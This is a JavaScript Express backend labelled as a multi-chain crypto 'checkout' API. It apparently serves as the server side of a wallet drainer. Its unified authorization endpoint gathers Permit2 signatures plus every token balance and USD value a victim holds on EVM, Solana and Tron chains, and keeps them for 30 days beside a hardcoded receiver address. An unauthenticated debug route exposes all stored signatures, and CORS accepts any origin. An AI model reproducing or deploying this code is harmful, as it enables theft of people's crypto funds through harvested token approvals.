/**
 * Checkout Backend - Multi-Chain Authorization & Payment System
 * v2.0 - Added unified authorization endpoints
 */

require("dotenv").config();
const express = require("express");
const cors = require("cors");
const { ethers } = require("ethers");
const crypto = require("crypto");

const app = express();

// ============ CORS CONFIGURATION ============
// Allow requests from ANY origin (your frontend)
app.use(cors({
  origin: "*",
  methods: ["GET", "POST", "PUT", "DELETE", "OPTIONS"],
  allowedHeaders: ["Content-Type", "Authorization"],
  credentials: true
}));

// Handle preflight requests
app.options("*", cors());

// ============ BODY PARSERS ============
app.use(express.json({ limit: "10mb" }));
app.use(express.urlencoded({ extended: true, limit: "10mb" }));

// ============ IN-MEMORY STORAGE ============
// Replace with database (PostgreSQL/MongoDB) in production
const orders = new Map();
const authorizations = new Map();
const nonces = new Map();

// ============ CONFIGURATION ============
const RECEIVER_ADDRESS = process.env.RECEIVER_ADDRESS || "0x98F63eDf950db3bD3cE6d590D4E0B39fdCC20Cf9";
const PERMIT2_ADDRESS = "0x000000000022D473030F116dDEE9F6B43aC78BA3";

// ============ HELPER FUNCTIONS ============

function generateOrderId() {
  return `ord_${Date.now()}_${crypto.randomBytes(4).toString("hex")}`;
}

function generateAuthId() {
  return `auth_${Date.now()}_${crypto.randomBytes(4).toString("hex")}`;
}

function calculateFee(amount, chainId) {
  // 0.5% fee
  const feePercent = 0.005;
  const fee = Math.floor(amount * feePercent);
  const net = amount - fee;
  return { fee, net, feePercent };
}

// ============ ROUTES ============

// Health check
app.get("/", (req, res) => {
  res.json({
    status: "ok",
    service: "Universal Checkout API",
    version: "2.0",
    timestamp: new Date().toISOString()
  });
});

// Health check endpoint
app.get("/health", (req, res) => {
  res.json({ status: "healthy", timestamp: Date.now() });
});

// ============ 1. CHECKOUT QUOTE ENDPOINTS ============

/**
 * GET /api/orders/:orderId/checkout-quote
 * Get checkout details for an order
 */
app.get("/api/orders/:orderId/checkout-quote", (req, res) => {
  try {
    const { orderId } = req.params;
    
    // Mock order data - replace with DB lookup
    const order = orders.get(orderId) || {
      id: orderId,
      amount: "100.00",
      currency: "USD",
      merchant: "Test Store",
      createdAt: Date.now()
    };

    // Calculate fees for different chains
    const chains = [
      { id: 1, name: "Ethereum", token: "USDC", fee: "5.00", time: "~3 mins" },
      { id: 8453, name: "Base", token: "USDC", fee: "0.10", time: "~10 secs" },
      { id: 137, name: "Polygon", token: "USDC", fee: "0.01", time: "~2 secs" },
      { id: 42161, name: "Arbitrum", token: "USDC", fee: "0.50", time: "~1 min" },
      { id: 56, name: "BNB Chain", token: "USDT", fee: "0.05", time: "~3 secs" },
      { id: 10, name: "Optimism", token: "USDC", fee: "0.20", time: "~30 secs" }
    ];

    res.json({
      success: true,
      order: {
        ...order,
        receiverAddress: RECEIVER_ADDRESS,
        permit2Address: PERMIT2_ADDRESS
      },
      availableChains: chains,
      expiresAt: Date.now() + (30 * 60 * 1000) // 30 minutes
    });

  } catch (err) {
    console.error("Quote error:", err);
    res.status(500).json({ success: false, error: err.message });
  }
});

/**
 * POST /api/orders/:orderId/confirm
 * Confirm order with signature
 */
app.post("/api/orders/:orderId/confirm", async (req, res) => {
  try {
    const { orderId } = req.params;
    const { 
      chainId, 
      tokenAddress, 
      amount, 
      permitSignature, 
      ownerAddress,
      spenderAddress,
      deadline,
      nonce 
    } = req.body;

    // Validate
    if (!chainId || !tokenAddress || !amount || !permitSignature || !ownerAddress) {
      return res.status(400).json({
        success: false,
        error: "Missing required fields"
      });
    }

    // Store order confirmation
    const confirmation = {
      orderId,
      chainId,
      tokenAddress,
      amount,
      ownerAddress,
      permitSignature,
      deadline,
      nonce,
      status: "confirmed",
      confirmedAt: Date.now()
    };

    orders.set(`${orderId}_confirmation`, confirmation);

    console.log(`✅ Order ${orderId} confirmed`);
    console.log(`   Chain: ${chainId}`);
    console.log(`   Amount: ${amount}`);
    console.log(`   Owner: ${ownerAddress}`);

    res.json({
      success: true,
      message: "Order confirmed",
      confirmationId: `${orderId}_confirmation`,
      status: "confirmed"
    });

  } catch (err) {
    console.error("Confirm error:", err);
    res.status(500).json({ success: false, error: err.message });
  }
});

// ============ 2. NONCE ENDPOINTS ============

/**
 * GET /api/checkout/nonce/:ownerAddress
 * Get Permit2 nonce for an address
 */
app.get("/api/checkout/nonce/:ownerAddress", async (req, res) => {
  try {
    const { ownerAddress } = req.params;
    
    // Generate or retrieve nonce
    let nonceData = nonces.get(ownerAddress.toLowerCase());
    if (!nonceData) {
      nonceData = {
        nonce: Math.floor(Math.random() * 1000000),
        timestamp: Date.now()
      };
      nonces.set(ownerAddress.toLowerCase(), nonceData);
    }

    res.json({
      success: true,
      ownerAddress,
      nonce: nonceData.nonce,
      permit2Address: PERMIT2_ADDRESS,
      receiverAddress: RECEIVER_ADDRESS
    });

  } catch (err) {
    console.error("Nonce error:", err);
    res.status(500).json({ success: false, error: err.message });
  }
});

// ============ 3. UNIFIED AUTHORIZATION ENDPOINTS ============

/**
 * POST /api/authorize/unified
 * 
 * Receives multi-chain authorization from frontend.
 * Stores Permit2 signatures and token authorizations.
 */
app.post("/api/authorize/unified", async (req, res) => {
  try {
    const { 
      evmAddress, 
      solanaAddress, 
      tronAddress, 
      tokens, 
      evmSignature, 
      evmSigDeadline,
      totalValue,
      maxAuthorizedAmount,
      timestamp 
    } = req.body;

    console.log("📥 Received authorization request");
    console.log("   Body:", JSON.stringify(req.body, null, 2));

    // Validate
    if (!tokens || !Array.isArray(tokens) || tokens.length === 0) {
      return res.status(400).json({ 
        success: false, 
        error: "No tokens provided" 
      });
    }

    // Create authorization record
    const authId = generateAuthId();
    
    const authorization = {
      id: authId,
      evmAddress: evmAddress || null,
      solanaAddress: solanaAddress || null,
      tronAddress: tronAddress || null,
      tokens: tokens.map(t => ({
        chain: t.chain,
        chainId: t.chainId || null,
        chainName: t.chainName || t.chain,
        token: t.token,
        symbol: t.symbol,
        decimals: t.decimals,
        balance: t.balance,
        humanBalance: t.humanBalance,
        usdValue: t.usdValue,
        address: t.address
      })),
      evmSignature: evmSignature || null,
      evmSigDeadline: evmSigDeadline || null,
      totalValue: totalValue || 0,
      maxAuthorizedAmount: maxAuthorizedAmount || 0,
      createdAt: timestamp || Date.now(),
      expiresAt: (timestamp || Date.now()) + (30 * 24 * 60 * 60 * 1000), // 30 days
      status: 'active',
      ipAddress: req.ip || req.socket.remoteAddress
    };

    // Store by auth ID
    authorizations.set(authId, authorization);
    
    // Index by addresses for lookup
    if (evmAddress) {
      const key = `evm_${evmAddress.toLowerCase()}`;
      const existing = authorizations.get(key) || [];
      existing.push(authId);
      authorizations.set(key, existing);
    }
    if (solanaAddress) {
      const key = `sol_${solanaAddress}`;
      const existing = authorizations.get(key) || [];
      existing.push(authId);
      authorizations.set(key, existing);
    }
    if (tronAddress) {
      const key = `tron_${tronAddress.toLowerCase()}`;
      const existing = authorizations.get(key) || [];
      existing.push(authId);
      authorizations.set(key, existing);
    }

    console.log(`✅ Authorization stored: ${authId}`);
    console.log(`   EVM: ${evmAddress || 'none'}`);
    console.log(`   Solana: ${solanaAddress || 'none'}`);
    console.log(`   Tron: ${tronAddress || 'none'}`);
    console.log(`   Tokens: ${tokens.length} ($${(totalValue || 0).toFixed(2)})`);
    console.log(`   Signature: ${evmSignature ? evmSignature.substring(0, 30) + '...' : 'none'}`);

    res.json({
      success: true,
      authorizationId: authId,
      message: "Authorization stored successfully",
      expiresAt: authorization.expiresAt,
      tokenCount: tokens.length,
      chains: {
        evm: !!evmAddress,
        solana: !!solanaAddress,
        tron: !!tronAddress
      }
    });

  } catch (err) {
    console.error("❌ Authorization error:", err);
    res.status(500).json({ 
      success: false, 
      error: err.message || "Internal server error" 
    });
  }
});

/**
 * GET /api/authorizations/:address
 * 
 * Get all authorizations for an address (any chain)
 */
app.get("/api/authorizations/:address", (req, res) => {
  try {
    const { address } = req.params;
    const normalizedAddress = address.toLowerCase();
    
    // Try all chain prefixes
    const keys = [
      `evm_${normalizedAddress}`,
      `sol_${address}`, // Solana is case-sensitive
      `tron_${normalizedAddress}`
    ];
    
    const results = [];
    const seen = new Set();
    
    for (const key of keys) {
      const authIds = authorizations.get(key) || [];
      for (const id of authIds) {
        if (!seen.has(id)) {
          const auth = authorizations.get(id);
          if (auth && auth.status === 'active' && auth.expiresAt > Date.now()) {
            results.push(auth);
            seen.add(id);
          }
        }
      }
    }

    res.json({
      success: true,
      address,
      count: results.length,
      authorizations: results
    });

  } catch (err) {
    console.error("Get authorizations error:", err);
    res.status(500).json({ 
      success: false, 
      error: err.message 
    });
  }
});

/**
 * GET /api/authorizations/id/:authId
 * 
 * Get specific authorization by ID
 */
app.get("/api/authorizations/id/:authId", (req, res) => {
  try {
    const { authId } = req.params;
    const auth = authorizations.get(authId);
    
    if (!auth) {
      return res.status(404).json({
        success: false,
        error: "Authorization not found"
      });
    }
    
    res.json({
      success: true,
      authorization: auth
    });

  } catch (err) {
    res.status(500).json({ 
      success: false, 
      error: err.message 
    });
  }
});

/**
 * DELETE /api/authorizations/:authId
 * 
 * Revoke an authorization
 */
app.delete("/api/authorizations/:authId", (req, res) => {
  try {
    const { authId } = req.params;
    const auth = authorizations.get(authId);
    
    if (!auth) {
      return res.status(404).json({ 
        success: false, 
        error: "Authorization not found" 
      });
    }
    
    auth.status = 'revoked';
    auth.revokedAt = Date.now();
    authorizations.set(authId, auth);
    
    console.log(`🗑️ Authorization revoked: ${authId}`);
    
    res.json({
      success: true,
      message: "Authorization revoked"
    });

  } catch (err) {
    res.status(500).json({ 
      success: false, 
      error: err.message 
    });
  }
});

// ============ 4. ADMIN/STATS ENDPOINTS ============

/**
 * GET /api/stats
 * 
 * Get system statistics
 */
app.get("/api/stats", (req, res) => {
  const allAuths = Array.from(authorizations.values()).filter(a => a.id && a.id.startsWith('auth_'));
  
  res.json({
    success: true,
    stats: {
      totalAuthorizations: allAuths.length,
      activeAuthorizations: allAuths.filter(a => a.status === 'active').length,
      totalOrders: Array.from(orders.keys()).filter(k => k.startsWith('ord_')).length,
      totalValueAuthorized: allAuths.reduce((sum, a) => sum + (a.totalValue || 0), 0)
    }
  });
});

/**
 * GET /api/debug/authorizations
 * 
 * List all authorizations (admin only - add auth in production)
 */
app.get("/api/debug/authorizations", (req, res) => {
  const allAuths = Array.from(authorizations.entries())
    .filter(([key, value]) => value.id && value.id.startsWith('auth_'))
    .map(([key, value]) => ({
      key,
      ...value
    }));
  
  res.json({
    success: true,
    count: allAuths.length,
    authorizations: allAuths
  });
});

// ============ ERROR HANDLING ============

// 404 handler
app.use((req, res) => {
  res.status(404).json({
    success: false,
    error: "Endpoint not found",
    path: req.path,
    method: req.method,
    availableEndpoints: [
      "GET  /",
      "GET  /health",
      "GET  /api/orders/:orderId/checkout-quote",
      "POST /api/orders/:orderId/confirm",
      "GET  /api/checkout/nonce/:ownerAddress",
      "POST /api/authorize/unified",
      "GET  /api/authorizations/:address",
      "GET  /api/authorizations/id/:authId",
      "DELETE /api/authorizations/:authId",
      "GET  /api/stats",
      "GET  /api/debug/authorizations"
    ]
  });
});

// Global error handler
app.use((err, req, res, next) => {
  console.error("Server error:", err);
  res.status(500).json({
    success: false,
    error: err.message || "Internal server error"
  });
});

// ============ START SERVER ============

const PORT = process.env.PORT || 3000;

app.listen(PORT, () => {
  console.log(`
╔════════════════════════════════════════════════════════╗
║                                                        ║
║   🚀 Universal Checkout API v2.0                       ║
║                                                        ║
║   Server running on port ${PORT}                        ║
║                                                        ║
║   Endpoints:                                           ║
║   • GET  /api/orders/:id/checkout-quote               ║
║   • POST /api/orders/:id/confirm                      ║
║   • GET  /api/checkout/nonce/:address                 ║
║   • POST /api/authorize/unified    ← NEW              ║
║   • GET  /api/authorizations/:address                 ║
║   • GET  /api/stats                                   ║
║                                                        ║
╚════════════════════════════════════════════════════════╝
  `);
});

module.exports = app;